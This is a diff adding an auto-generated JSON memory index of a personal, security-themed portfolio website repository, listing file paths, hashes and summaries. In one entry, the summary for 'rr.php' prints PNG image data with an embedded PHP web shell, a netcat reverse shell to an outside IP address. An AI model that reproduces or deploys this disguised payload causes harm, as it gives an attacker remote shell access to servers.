@@ -1,0 +1,359 @@
+{
+  "project": {
+    "name": "Ayush Portfolio",
+    "description": "",
+    "goals": [],
+    "version": ""
+  },
+  "workspaceRoots": [
+    "d:\\Ayush Portfolio"
+  ],
+  "stack": {
+    "frontend": "",
+    "backend": "",
+    "database": "",
+    "auth": "",
+    "devOps": "",
+    "other": []
+  },
+  "structure": {
+    "rootFolders": [
+      "irainsec.github.io-main"
+    ],
+    "mainEntryPoints": [
+      "irainsec.github.io-main/birthday/README.md",
+      "irainsec.github.io-main/README.md",
+      "irainsec.github.io-main/birthday/script/main.js",
+      "irainsec.github.io-main/js/main.js"
+    ],
+    "totalFiles": 31,
+    "analyzedFiles": 30
+  },
+  "dependencies": {
+    "production": {},
+    "development": {},
+    "frameworks": []
+  },
+  "api": {
+    "endpoints": [],
+    "baseUrl": ""
+  },
+  "environment": {
+    "variables": []
+  },
+  "database": {
+    "type": "",
+    "models": [],
+    "schemas": []
+  },
+  "files": [
+    {
+      "path": "irainsec.github.io-main/birthday/README.md",
+      "priority": "critical",
+      "summary": "README: . [Demo](https://fajarghifar.github.io/happybirthday/). Sections: 🎉 Birthday Greeting Webpage, 🚀 How to Use, 📝 Contributing, 🤝 License",
+      "lastAnalyzed": "2026-09-07T14:51:48.105Z",
+      "hash": "086c1526e1dacc1381a1569035e2db957b1e2b8dd5a836fdc3bcf11f84a9f043",
+      "size": 1102,
+      "language": "Markdown"
+    },
+    {
+      "path": "irainsec.github.io-main/README.md",
+      "priority": "critical",
+      "summary": "README: . personal portfolio <3. Sections: ",
+      "lastAnalyzed": "2026-09-07T14:51:48.115Z",
+      "hash": "21d53091881f372fd42bfdf7823a42e7d1d73ba9f4f5d2a5644c67bc6c8f6ea8",
+      "size": 22,
+      "language": "Markdown"
+    },
+    {
+      "path": "irainsec.github.io-main/birthday/script/main.js",
+      "priority": "high",
+      "summary": "fn typeWriterInput(element: any, text: any, speed: any, callback: any): void | fn burstConfetti(): void | fn spawnBackgroundImage(): void",
+      "lastAnalyzed": "2026-09-07T14:51:48.444Z",
+      "hash": "98aae45a485cb390a73db23f8dd028380ce1c8ab33a577a04a91c38f9dc29d19",
+      "size": 16549,
+      "language": "JavaScript"
+    },
+    {
+      "path": "irainsec.github.io-main/js/main.js",
+      "priority": "high",
+      "summary": "(function($) {     $(document).ready(function() {         // Toggle the menu on button click",
+      "lastAnalyzed": "2026-09-07T14:51:48.468Z",
+      "hash": "31982a932523cd48713cb8d3312c656de4a87c38c8c219d6907d4f53d420222b",
+      "size": 1108,
+      "language": "JavaScript"
+    },
+    {
+      "path": ".vscode/context-optimizer/memory.json",
+      "priority": "low",
+      "summary": "  \"project\": {     \"name\": \"Ayush Portfolio\",     \"description\": \"\",",
+      "lastAnalyzed": "2026-09-07T14:51:48.480Z",
+      "hash": "e2dfb97d2b5282a0c20f17c06b5e367663f8a7852fb45576e5d8a1348f00eb9e",
+      "size": 1249,
+      "language": "JSON"
+    },
+    {
+      "path": "irainsec.github.io-main/.vscode/launch.json",
+      "priority": "low",
+      "summary": "    // Use IntelliSense to learn about possible attributes.     // Hover to view descriptions of existing attributes.     // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387",
+      "lastAnalyzed": "2026-09-07T14:51:48.490Z",
+      "hash": "0f91689ffafec3ee55ff3ea07aee0d96b797c71692439f16ace652504bc1df26",
+      "size": 463,
+      "language": "JSON"
+    },
+    {
+      "path": "irainsec.github.io-main/about.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
+      "lastAnalyzed": "2026-09-07T14:51:48.503Z",
+      "hash": "09529ed0142b52288ba1b47b0f30e551063d55fc7e1d404fabb63e1db1d62150",
+      "size": 18626,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/batchfile.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
+      "lastAnalyzed": "2026-09-07T14:51:48.516Z",
+      "hash": "80b3741d461e179b4670d3efa2719fe8191c1916ba4e8be07c32bb8e95857fba",
+      "size": 8471,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/birthday/index.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html> <html lang=\"en\">     <meta charset=\"UTF-8\" />",
+      "lastAnalyzed": "2026-09-07T14:51:48.532Z",
+      "hash": "8c135bdcf7ecc3c954f73a1e1b00b03b462a081527c2774c0ae9011a36b50129",
+      "size": 11174,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/birthday/LICENSE",
+      "priority": "low",
+      "summary": "MIT License Copyright (c) 2022 Fajar Ghifari Nugroho Permission is hereby granted, free of charge, to any person obtaining a copy",
+      "lastAnalyzed": "2026-09-07T14:51:48.544Z",
+      "hash": "d6953db7d5e8481110579b760d83cee06142e2dacf146c719af3c14e3cdf22b6",
+      "size": 1078,
+      "language": ""
+    },
+    {
+      "path": "irainsec.github.io-main/birthday/music/hbd.mpeg",
+      "priority": "low",
+      "summary": "Oversized file (1.65 MB). Full analysis skipped to save token context.",
+      "lastAnalyzed": "2026-09-07T14:51:48.545Z",
+      "hash": "oversized_1725224_1788774792818.1846",
+      "size": 1725224,
+      "language": "MPEG"
+    },
+    {
+      "path": "irainsec.github.io-main/birthday/style/main.css",
+      "priority": "low",
+      "summary": "  box-sizing: border-box;   font-family: 'Poppins', sans-serif;   background: linear-gradient(135deg, #fff0f5 0%, #e6e6fa 100%);",
+      "lastAnalyzed": "2026-09-07T14:51:48.569Z",
+      "hash": "2aacdc3b4bdb339092c292b35ded0e65edeb683260debaf3be2f857d04b920e0",
+      "size": 13470,
+      "language": "CSS"
+    },
+    {
+      "path": "irainsec.github.io-main/blogs.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
+      "lastAnalyzed": "2026-09-07T14:51:48.583Z",
+      "hash": "367883d13806a85cb05def3b3ce678384a05a833f7e05cf3e4d996809d3c8c1f",
+      "size": 12180,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/certifications.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html> <html lang=\"en\">     <meta charset=\"UTF-8\">",
+      "lastAnalyzed": "2026-09-07T14:51:48.595Z",
+      "hash": "d53cac7d635baf554469d0266e7ab37905fea96e40982652bdbf75920fdf2ed0",
+      "size": 16252,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/CNAME",
+      "priority": "low",
+      "summary": "www.iamanraj.com",
+      "lastAnalyzed": "2026-09-07T14:51:48.607Z",
+      "hash": "80f3917d63eb8498d4353c2634cf039a196185ba12c35a68863c38557c8179c4",
+      "size": 16,
+      "language": ""
+    },
+    {
+      "path": "irainsec.github.io-main/contact.html",
+      "priority": "low",
+      "summary": "Functions: sendEmail",
+      "lastAnalyzed": "2026-09-07T14:51:48.662Z",
+      "hash": "5845caae3a1177f6f94c505757a57dea38ce3a5696f1d026df2084cc64c51a20",
+      "size": 8798,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/css/aos.css",
+      "priority": "low",
+      "summary": "[data-aos][data-aos][data-aos-duration=\"50\"],body[data-aos-duration=\"50\"] [data-aos]{transition-duration:50ms}[data-aos][data-aos][data-aos-delay=\"50\"],body[data-aos-delay=\"50\"] [data-aos]{transition-",
+      "lastAnalyzed": "2026-09-07T14:51:48.674Z",
+      "hash": "1aa8845fd06e475aefe733d4e55b36a92fcd487975049c8172341827ac9cc03e",
+      "size": 26053,
+      "language": "CSS"
+    },
+    {
+      "path": "irainsec.github.io-main/css/bootstrap.min.css",
+      "priority": "low",
+      "summary": "@charset \"UTF-8\";/*!  * Bootstrap v5.0.2 (https://getbootstrap.com/)  * Copyright 2011-2021 The Bootstrap Authors",
+      "lastAnalyzed": "2026-09-07T14:51:48.691Z",
+      "hash": "bbf654e6433dcb5a31034bf9831fbd434644102751a60ff683fd4f8246c12c2a",
+      "size": 155800,
+      "language": "CSS"
+    },
+    {
+      "path": "irainsec.github.io-main/css/iconoir.css",
+      "priority": "low",
+      "summary": "Oversized file (2.09 MB). Full analysis skipped to save token context.",
+      "lastAnalyzed": "2026-09-07T14:51:48.692Z",
+      "hash": "oversized_2192814_1788774792870.3193",
+      "size": 2192814,
+      "language": "CSS"
+    },
+    {
+      "path": "irainsec.github.io-main/css/style.css",
+      "priority": "low",
+      "summary": "    -- Table of Content --     * # Preloader     * # InfoBox",
+      "lastAnalyzed": "2026-09-07T14:51:48.704Z",
+      "hash": "00c340276d80447b139f87d2a629246a5572d69fd70626339f5bf4fe9978062b",
+      "size": 51667,
+      "language": "CSS"
+    },
+    {
+      "path": "irainsec.github.io-main/htb.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
+      "lastAnalyzed": "2026-09-07T14:51:48.732Z",
+      "hash": "a6ac752887c99f4a0207309dddb84eb3e07bc87135185b38c2cb98c28911f1b4",
+      "size": 10805,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/images/extras/rr.php",
+      "priority": "low",
+      "summary": "\u0000\u0000\u0000\rIHDR\u0000\u0000\u0001�\u0000\u0000\u0001�\b\u0006\u0000\u0000\u0000���2\u0000\u0000\u0000\u0001sRGB\u0000��\u001c�\u0000\u0000\u0000>tEXtComment\u0000<?php system(\"nc 194.195.114.92 443 -e /bin/bash\"); ?>�ʿ\u0000\u0000 \u0000IDATx^�}\u0007|\u0015e����;�%77�TH\bI\u0000�XPT\u0010Q\u0014Ŷ�]{]\u000b�������wW׶bo+���`�7\u0011\u0004B\t\u0012H �'���3�w����|����\u001f��",
+      "lastAnalyzed": "2026-09-07T14:51:48.770Z",
+      "hash": "92299d365a15832ad7aba7b41d2c5eafb4008ed67098ef0ab3da6af57a123e55",
+      "size": 283355,
+      "language": "PHP"
+    },
+    {
+      "path": "irainsec.github.io-main/index.html",
+      "priority": "medium",
+      "summary": "<!DOCTYPE html> <html lang=\"en\">     <meta charset=\"UTF-8\">",
+      "lastAnalyzed": "2026-09-07T19:34:26.964Z",
+      "hash": "4bd13b824e9ae16c3eb00990cce8c592c1140859d69e74e64a589a96669293c8",
+      "size": 17106,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/js/aos.js",
+      "priority": "low",
+      "summary": "!function(e,t){\"object\"==typeof exports&&\"object\"==typeof module?module.exports=t():\"function\"==typeof define&&define.amd?define([],t):\"object\"==typeof exports?exports.AOS=t():e.AOS=t()}(this,(functio",
+      "lastAnalyzed": "2026-09-07T14:51:48.838Z",
+      "hash": "6c84f6c16d74ecf3e7f9e24bc0539ce5028c99a1ff457edc8f2f193563e2e7e5",
+      "size": 13988,
+      "language": "JavaScript"
+    },
+    {
+      "path": "irainsec.github.io-main/js/bootstrap.bundle.min.js",
+      "priority": "low",
+      "summary": "  * Bootstrap v5.0.2 (https://getbootstrap.com/)   * Copyright 2011-2021 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)   * Licensed under MIT (https://github.com/twbs/b",
+      "lastAnalyzed": "2026-09-07T14:51:48.931Z",
+      "hash": "7fac5bb2420cbd11cd7f980e94e669d7561e23d1fd68f275e784f6b7376d4bad",
+      "size": 78917,
+      "language": "JavaScript"
+    },
+    {
+      "path": "irainsec.github.io-main/js/jquery-3.6.4.js",
+      "priority": "low",
+      "summary": "Functions: DOMEval, toType, isArrayLike, Sizzle, createCache, cache, markFunction, assert, addHandle, siblingCheck, createInputPseudo, createButtonPseudo +73 more",
+      "lastAnalyzed": "2026-09-07T14:51:49.095Z",
+      "hash": "c50c7a548143b41194f9a74f9d569fb3dc3a67ad345a2f484bb35b3d55bff2d6",
+      "size": 293184,
+      "language": "JavaScript"
+    },
+    {
+      "path": "irainsec.github.io-main/reports.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
+      "lastAnalyzed": "2026-09-07T14:51:49.110Z",
+      "hash": "946b70fe272fbefc07ab99005e9c7245a0ebcb2faecb461aa3d7d60eb1a61320",
+      "size": 10803,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/thm.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
+      "lastAnalyzed": "2026-09-07T14:51:49.124Z",
+      "hash": "0490dc1d9437eb83d44ffaab70f9834b328481efbd4b89251fe497933eef1d69",
+      "size": 10805,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/works.html",
+      "priority": "medium",
+      "summary": "<!DOCTYPE html>\r <html lang=\"en\">\r     <meta charset=\"UTF-8\">\r",
+      "lastAnalyzed": "2026-09-07T19:07:25.948Z",
+      "hash": "bb0205c70e368465951cd335605959376b8d57d55e366004b46f25514b3db4a7",
+      "size": 12596,
+      "language": "HTML"
+    },
+    {
+      "path": "irainsec.github.io-main/youtube.html",
+      "priority": "medium",
+      "summary": "<!DOCTYPE html> <html lang=\"en\">     <meta charset=\"UTF-8\">",
+      "lastAnalyzed": "2026-09-07T15:41:40.762Z",
+      "hash": "0da66427b80b7b42ecb44a735a747285cc9031908581a457aed6fd3fe037c8fc",
+      "size": 11791,
+      "language": "HTML"
+    },
+    {
+      "path": "c:/Users/rayay/AppData/Roaming/Antigravity IDE/User/settings.json",
+      "priority": "medium",
+      "summary": "    \"python.languageServer\": \"Default\"\r",
+      "lastAnalyzed": "2026-09-07T20:56:06.651Z",
+      "hash": "927e30f8b91e4f123de2d20c7107dae9af9bdadd3dcd107d3d96c1017e0d0442",
+      "size": 44,
+      "language": "JSON"
+    }
+  ],
+  "features": {
+    "completed": [],
+    "pending": [],
+    "inProgress": []
+  },
+  "bugs": [],
+  "codingStyle": {
+    "patterns": [],
+    "namingConventions": [],
+    "libraries": []
+  },
+  "architecture": {
+    "summary": "",
+    "decisions": [],
+    "patterns": []
+  },
+  "conversations": [],
+  "rules": [],
+  "developerNotes": [],
+  "meta": {
+    "lastUpdated": "2026-09-07T20:56:06.651Z",
+    "version": "1.0.0",
+    "workspaceRoot": "d:\\Ayush Portfolio",
+    "tokenEstimate": {
+      "original": 1059,
+      "compressed": 187,
+      "savedPercent": 82.3
+    }
+  }
+}
